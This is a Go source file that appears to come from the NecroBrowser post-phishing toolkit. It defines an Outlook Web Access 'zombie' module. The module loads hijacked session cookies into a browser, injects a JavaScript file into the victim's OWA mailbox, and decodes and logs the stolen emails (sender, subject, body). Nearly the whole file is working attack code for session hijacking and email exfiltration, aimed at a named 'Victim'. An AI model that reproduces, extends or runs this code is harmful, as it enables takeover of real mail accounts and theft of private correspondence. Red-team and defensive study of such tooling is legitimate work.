package owa

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"

	"github.com/fatih/color"

	"github.com/muraenateam/necrobrowser/action/cookie"
	"github.com/muraenateam/necrobrowser/action/dom"
	"github.com/muraenateam/necrobrowser/log"
	"github.com/muraenateam/necrobrowser/zombie"
)

const (
	// Name of this zombie
	Name = "OWA"
)

type OWA struct {
	zombie.Target

	URL             string
	Version         string
	owaInjectorPath string
}

type Extrusion struct {
	zombie.Extrusion

	Keys         string // base64 encoded /settings/keys HTML page content
	Security     string // base64 encoded /settings/security HTML page content
	Profile      string
	Account      string
	Emails       string
	Repositories map[string]string // full path - base64 encoded .zip content
}

type Email2016 struct {
	Victim  string `json:"target" binding:"required"`
	MatchOn string `json:"search" binding:"required"`
	Type    string `json:"type" binding:"required"`
	Time    string `json:"time" binding:"required"`
	From    string `json:"from" binding:"required"`
	Subject string `json:"subject" binding:"required"`
	Body    string `json:"body" binding:"required"`
}

func NewOWA(target zombie.Target) *OWA {

	target.Tag = zombie.GetTag(Name)
	return &OWA{
		Target:          target,
		URL:             "https://owa.anti-env.local/owa/",
		owaInjectorPath: "./injectors/owa2016.js",
		Version:         "2016",
	}
}

// Name returns the action name
func (z *OWA) Name() string {
	return Name
}

// SetTarget updates the zombie target object
func (z *OWA) SetLootPath(lp string) {
	z.Target.LootPath = lp
}

// SetContext updates the zombie context object
func (z *OWA) SetContext(c context.Context) {
	z.Target.Context = c
}

// Instrument instructs the chrome context to perform operations on the defined target
func (z *OWA) Instrument() (interface{}, error) {

	var (
		ext Extrusion
		err error
	)

	//
	// Set session Cookies
	//
	c := &cookie.Cookie{}
	c.Target = z.Target
	if err = c.SetSessionCookies(); err != nil {
		log.Error("Error setting session cookies: %v", err)
		return nil, err
	}

	//
	// Extrusion
	//

	// Load JS to inject
	inject, err := ioutil.ReadFile(z.owaInjectorPath) // just pass the file name
	if err != nil {
		log.Error("Error reading OWA Injector file: %v", err)
		return nil, err
	}

	// Inject JS
	var extrudedEmails []string
	d := &dom.DOM{
		URL: z.URL,
	}
	d.Target = z.Target
	if err = d.InjectJS(string(inject), &extrudedEmails); err != nil {
		log.Error("Error evaluating and/or injecting JavaScript: %v", err)
		return nil, err
	}

	yellow := color.New(color.FgYellow).SprintFunc()
	red := color.New(color.FgRed).SprintFunc()

	for _, email := range extrudedEmails {
		var owaEmail Email2016

		d, err := base64.StdEncoding.DecodeString(email)
		if err != nil {
			log.Error("Error decoding base64 email: %s", err)
			continue
		}

		err = json.Unmarshal(d, &owaEmail)
		if err != nil {
			log.Error("Error unmarshalling extruded OWA email. Affected Base64:\n %s", email)
			continue
		}

		log.Info("MatchOn(%s) From(%s) Subject(%s) Body(%d bytes)", red(owaEmail.MatchOn), yellow(owaEmail.From), yellow(owaEmail.Subject), len(owaEmail.Body))
	}

	return ext, nil
}
